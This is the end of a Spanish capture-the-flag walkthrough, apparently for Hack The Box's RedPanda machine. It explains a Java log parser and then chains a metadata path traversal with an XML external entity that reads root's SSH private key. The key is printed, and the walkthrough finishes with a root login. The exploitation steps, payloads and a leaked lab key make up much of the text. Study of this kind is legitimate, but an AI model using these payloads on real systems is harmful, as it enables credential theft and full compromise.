+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">public static </span><span class="na">String </span><span class="p">getArtist(</span><span class="na">String </span><span class="p">uri) throws </span><span class="na">IOException</span><span class="p">, </span><span class="na">JpegProcessingException  </span><span class="p">
+{
+    </span><span class="na">String </span><span class="p">fullpath </span><span class="o">= </span><span class="s2">"/opt/panda_search/src/main/resources/static" </span><span class="o">+ </span><span class="p">uri;
+    </span><span class="na">File </span><span class="p">jpgFile </span><span class="o">= new </span><span class="na">File</span><span class="p">(fullpath);
+    </span><span class="na">Metadata </span><span class="p">metadata </span><span class="o">= </span><span class="na">JpegMetadataReader</span><span class="p">.readMetadata(jpgFile);
+    </span><span class="o">for</span><span class="p">(</span><span class="na">Directory </span><span class="p">dir </span><span class="o">: </span><span class="p">metadata.getDirectories())
+    {
+        </span><span class="o">for</span><span class="p">(</span><span class="na">Tag </span><span class="p">tag </span><span class="o">: </span><span class="p">dir.getTags())
+        {
+            </span><span class="o">if</span><span class="p">(tag.getTagName() </span><span class="p">== </span><span class="s">"Artist"</span><span class="p">)
+            {
+                </span><span class="o">return </span><span class="p">tag.getDescription();
+            }
+        }
+    }
+
+    </span><span class="o">return </span><span class="s">"N/A"</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente el main define una variable <code class="language-plaintext highlighter-rouge">xmlPath</code> que vale una ruta conformada por <code class="language-plaintext highlighter-rouge">/credits/</code> más el campo <code class="language-plaintext highlighter-rouge">artist</code> que recibe de getArtist y al final le agrega <code class="language-plaintext highlighter-rouge">_creds.xml</code>, después llama a <code class="language-plaintext highlighter-rouge">addViewTo</code> y le pasa como argumentos el xmlPath y uri</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="na">String </span><span class="p">xmlPath </span><span class="o">= </span><span class="s">"/credits/" </span><span class="o">+ </span><span class="p">artist </span><span class="o">+ </span><span class="s">"_creds.xml"</span><span class="p">;
+addViewTo(xmlPath, parsed_data.get(</span><span class="s">"uri"</span><span class="p">).toString());  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Vamos a la función <code class="language-plaintext highlighter-rouge">addViewTo</code>, resumiendo su funcionamiento interpreta el xml, realiza una condición si el uri de la imagn coincide con el uri que recibió como paramtetro, si se cumple aumenta el total de views, y finalmente reescribe el <code class="language-plaintext highlighter-rouge">XML</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">public static </span><span class="p">void addViewTo(</span><span class="na">String </span><span class="p">path, </span><span class="na">String </span><span class="p">uri) throws </span><span class="na">JDOMException</span><span class="p">,</span><span class="na"> IOException</span><span class="p">
+{
+    </span><span class="na">SAXBuilder </span><span class="p">saxBuilder </span><span class="o">= new </span><span class="na">SAXBuilder</span><span class="p">();
+    </span><span class="na">XMLOutputter </span><span class="p">xmlOutput </span><span class="o">= new </span><span class="na">XMLOutputter</span><span class="p">();
+    xmlOutput.setFormat(</span><span class="na">Format</span><span class="p">.getPrettyFormat());
+
+    </span><span class="na">File </span><span class="p">fd </span><span class="o">= new </span><span class="na">File</span><span class="p">(path);
+    
+    </span><span class="na">Document </span><span class="p">doc </span><span class="o">= </span><span class="p">saxBuilder.build(fd);
+    
+    </span><span class="na">Element </span><span class="p">rootElement </span><span class="o">= </span><span class="p">doc.getRootElement();
+
+    </span><span class="o">for</span><span class="p">(</span><span class="na">Element </span><span class="p">el</span><span class="o">: </span><span class="p">rootElement.getChildren())
+    {
+
+
+        </span><span class="o">if</span><span class="p">(el.getName() </span><span class="o">== </span><span class="s">"image"</span><span class="p">)
+        {
+            </span><span class="o">if</span><span class="p">(el.getChild(</span><span class="s">"uri"</span><span class="p">).getText().equals(uri))
+            {
+                </span><span class="na">Integer </span><span class="p">totalviews </span><span class="o">= </span><span class="na">Integer</span><span class="p">.parseInt(rootElement.getChild(</span><span class="s">"totalviews"</span><span class="p">).getText()) </span><span class="o">+ </span><span class="mi">1</span><span class="p">;  
+                </span><span class="na">System</span><span class="p">.out.println(</span><span class="s">"Total views:" </span><span class="o">+ </span><span class="na">Integer</span><span class="p">.toString(totalviews));
+                rootElement.getChild(</span><span class="s">"totalviews"</span><span class="p">).setText(</span><span class="na">Integer</span><span class="p">.toString(totalviews));
+                </span><span class="na">Integer </span><span class="p">views </span><span class="o">= </span><span class="na">Integer</span><span class="p">.parseInt(el.getChild(</span><span class="s">"views"</span><span class="p">).getText());
+                el.getChild(</span><span class="s">"views"</span><span class="p">).setText(</span><span class="na">Integer</span><span class="p">.toString(views </span><span class="o">+ </span><span class="mi">1</span><span class="p">));
+            }
+        }
+    }
+    </span><span class="na">BufferedWriter </span><span class="p">writer </span><span class="o">= new </span><span class="na">BufferedWriter</span><span class="p">(</span><span class="o">new </span><span class="na">FileWriter</span><span class="p">(fd));
+    xmlOutput.output(doc, writer);
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Analizemos, la variable artist sale de el campo <code class="language-plaintext highlighter-rouge">Artist</code> de la metadata de la imagen con esa variable se conforma la ruta del xml que se interpreta con la función anterior</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">"/credits/" </span><span class="o">+ </span><span class="p">artist </span><span class="o">+</span><span class="s"> "_creds.xml"  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos tomar una imagen cualquiera y con <code class="language-plaintext highlighter-rouge">exiftool</code> modificar en el metadato Artist para aplicar un <code class="language-plaintext highlighter-rouge">Directory Path Traversal</code>, retroceder un directorio y apuntar a el home donde tenemos capacidad de escritura, el artist lo dejaremos como artist</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ exiftool</span><span class="p"> -Artist=</span><span class="am">"../home/woodenk/artist" </span><span class="p">image.jpg  
+    1 image files updated</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">De este modo la ruta del <code class="language-plaintext highlighter-rouge">xml</code> queda en una ruta en la que podemos leer y escribir</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">"/credits/" </span><span class="o">+ </span><span class="s">"../home/woodenk/artist" </span><span class="o">+</span><span class="s"> "_creds.xml"  </span><span class="p">
+
+</span><span class="p">/credits/../home/woodenk/artist_creds.xml</span><span class="p">
+
+/home/woodenk/artist_creds.xml</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para el archivo xml usaremos uno de los ejemplos que tenemos en la máquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/credits</span><span class="p">$ ls -l
+-rw-r----- 1 root logs 422 Mar 17 03:26 damian_creds.xml
+-rw-r----- 1 root logs 426 Mar 17 03:26 woodenk_creds.xml  
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/credits</span><span class="p">$ cat damian_creds.xml  
+&lt?xml version="1.0" encoding="UTF-8"?>
+&ltcredits>
+  &ltauthor>damian&lt/author>
+  &ltimage>
+    &lturi>/img/angy.jpg&lt/uri>
+    &ltviews>1&lt/views>
+  &lt/image>
+  &ltimage>
+    &lturi>/img/shy.jpg&lt/uri>
+    &ltviews>0&lt/views>
+  &lt/image>
+  &ltimage>
+    &lturi>/img/crafty.jpg&lt/uri>
+    &ltviews>0&lt/views>
+  &lt/image>
+  &ltimage>
+    &lturi>/img/peter.jpg&lt/uri>
+    &ltviews>0&lt/views>
+  &lt/image>
+  &lttotalviews>1&lt/totalviews>
+&lt/credits>
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/credits</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aplicaremos un <code class="language-plaintext highlighter-rouge">XML External Entity</code> de toda la vida, tomaremos como base el xml y crearemos el nuestro, definimos una entidad <code class="language-plaintext highlighter-rouge">key</code> que tendra como valor un archivo la <code class="language-plaintext highlighter-rouge">id_rsa</code> del usuario root que la llamaremos en el campo author</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">&lt!--?xml version="1.0" ?-->
+&lt!</span><span class="o">DOCTYPE </span><span class="p">replace [&lt!</span><span class="o">ENTITY </span><span class="p">key </span><span class="no">SYSTEM </span><span class="s">"file:///root/.ssh/id_rsa"</span><span class="p">> ]>  
+&lt</span><span class="o">credits</span><span class="p">>
+  &lt</span><span class="o">author</span><span class="p">></span><span class="mi">&key;</span><span class="p">&lt/</span><span class="o">author</span><span class="p">>
+  &lt</span><span class="o">image</span><span class="p">>
+    &lt</span><span class="o">uri</span><span class="p">>/img/angy.jpg&lt/</span><span class="o">uri</span><span class="p">>
+    &lt</span><span class="o">views</span><span class="p">>0&lt/</span><span class="o">views</span><span class="p">>
+  &lt/</span><span class="o">image</span><span class="p">>
+  &lt</span><span class="o">totalviews</span><span class="p">>0&lt/</span><span class="o">totalviews</span><span class="p">>
+&lt/</span><span class="o">credits</span><span class="p">></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tanto el <code class="language-plaintext highlighter-rouge">image.png</code> con la metadata modificada como el xml con el nombre <code class="language-plaintext highlighter-rouge">artist_creds.xml</code> debemos subirlas a la máquina victima en <code class="language-plaintext highlighter-rouge">/home/woodenk</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l  
+-rw-rw-r-- 1 woodenk logs      642 Mar 17 06:20 artist_creds.xml  
+-rw-rw-r-- 1 woodenk logs    33535 Mar 17 06:12 image.jpg
+-rw-r----- 1 woodenk woodenk    33 Mar 17 03:02 user.txt
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora realizaremos una petición con cualquier cosa seguida de <code class="language-plaintext highlighter-rouge">||</code> seguida de un <code class="language-plaintext highlighter-rouge">Directory Path Traversal</code> hacia el <code class="language-plaintext highlighter-rouge">image.jpg</code>, esto como campo de <code class="language-plaintext highlighter-rouge">User-Agent</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">http://redpanda.htb:8080 -A </span><span class="am">"test||/../../../../../../../home/woodenk/image.jpg"  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">De forma que el archivo que tiene los logs represente los datos de la siguiente manera</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/opt/panda_search</span><span class="p">$ cat redpanda.log  
+
+200||10.10.14.10||test||/../../../../../../../home/woodenk/image.jpg||/  
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/opt/panda_search</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">De esta forma el campo uri que apunta a la imágen tendrá el siguiente valor</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">"/opt/panda_search/src/main/resources/static" </span><span class="o">+</span><span class="s"> "/../../../../../../../home/woodenk/image.jpg"  </span><span class="p">
+
+/opt/panda_search/src/main/resources/static/../../../../../../../home/woodenk/image.jpg
+
+/home/woodenk/image.jpg</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Asi cuando se ejecute la tarea en unos segundos, extraerá la <code class="language-plaintext highlighter-rouge">metadata</code> de la imagen y la ruta del <code class="language-plaintext highlighter-rouge">xml</code> sera la que definimos con exiftool, al interpretarse el xml y volver a escribirlo deberiamos poder ver la entidad <code class="language-plaintext highlighter-rouge">key</code> interpretada, la <code class="language-plaintext highlighter-rouge">id_rsa</code> de root</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat artist_creds.xml 
+&lt?xml version="1.0" encoding="UTF-8"?>
+&lt!--?xml version="1.0" ?-->
+&lt!DOCTYPE replace>
+&ltcredits>
+  &ltauthor>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
+ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
+AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ  
+RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
+-----END OPENSSH PRIVATE KEY-----&lt/author>
+  &ltimage>
+    &lturi>/img/angy.jpg&lt/uri>
+    &ltviews>0&lt/views>
+  &lt/image>
+  &lttotalviews>0&lt/totalviews>
+&lt/credits>
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente con la id_rsa de <code class="language-plaintext highlighter-rouge">root</code> podemos conectarnos sin contraseña y leer la flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">root@10.10.11.170 -i id_rsa
+</span><span class="ve">root@redpanda</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)  
+</span><span class="ve">root@redpanda</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
+10.10.11.170
+</span><span class="ve">root@redpanda</span><span class="p">:</span><span class="az">~</span><span class="p"># cat root.txt  
+ff0**************************4f2
+</span><span class="ve">root@redpanda</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
